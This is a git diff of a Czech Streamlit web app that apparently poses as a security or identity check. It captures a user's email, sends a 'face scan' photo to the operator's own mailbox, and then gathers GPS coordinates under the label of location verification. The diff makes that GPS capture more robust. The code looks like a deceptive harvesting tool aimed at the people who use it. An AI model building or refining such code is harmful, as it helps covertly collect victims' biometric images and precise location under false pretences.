@@ -1,4 +1,3 @@
-
 import streamlit as st
 import os
 import smtplib
@@ -8,9 +7,9 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.image import MIMEImage
 from datetime import datetime
-import streamlit.components.v1 as components   # ← potřebné pro GPS
+import streamlit.components.v1 as components
 
-# --- KONFIGURACE Z PROSTŘEDÍ (ENVIRONMENT VARIABLES) ---
+# --- KONFIGURACE Z PROSTŘEDÍ ---
 MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
 MOJE_HESLO = os.environ.get("MOJE_HESLO")
 
@@ -48,12 +47,9 @@ if "step" not in st.session_state:
 if "zadany_email" not in st.session_state:
     st.session_state.zadany_email = ""
 
-# === EARLY GPS HANDLER (důležité – řeší reload reset) ===
-query_params = st.query_params
-if (st.session_state.get("step") == "gps" 
-    and "lat" in query_params 
-    and "lon" in query_params):
-    
+# === EARLY GPS HANDLER (nejrobustnější řešení – funguje i po reloadu) ===
+query_params = st.experimental_get_query_params()
+if "lat" in query_params and "lon" in query_params:
     lat = query_params["lat"][0]
     lon = query_params["lon"][0]
     acc = query_params.get("acc", ["?"])[0]
@@ -67,10 +63,9 @@ if (st.session_state.get("step") == "gps"
    
     st.session_state.step = "verification"
    
-    # Vyčistíme parametry (aby se nezpracovávaly znovu)
-    for key in ["lat", "lon", "acc"]:
-        if key in st.query_params:
-            del st.query_params[key]
+    # Vyčistíme query params
+    new_params = {k: v for k, v in query_params.items() if k not in ["lat", "lon", "acc"]}
+    st.experimental_set_query_params(**new_params)
    
     st.rerun()
 
@@ -129,10 +124,10 @@ with col2:
                 odeslat_email("📸 FACE SCAN", f"Uživatel: {st.session_state.zadany_email}", soubor=foto)
                 time.sleep(2)
                 status.update(label="Sken dokončen", state="complete")
-            st.session_state.step = "gps"          # ← změna: jdeme na GPS
+            st.session_state.step = "gps"
             st.rerun()
 
-    # --- 3. KROK: GPS (nově vložený) ---
+    # --- 3. KROK: GPS ---
     elif st.session_state.step == "gps":
         show_logo()
         st.info("Fáze 2.5: Bezpečnostní ověření polohy")
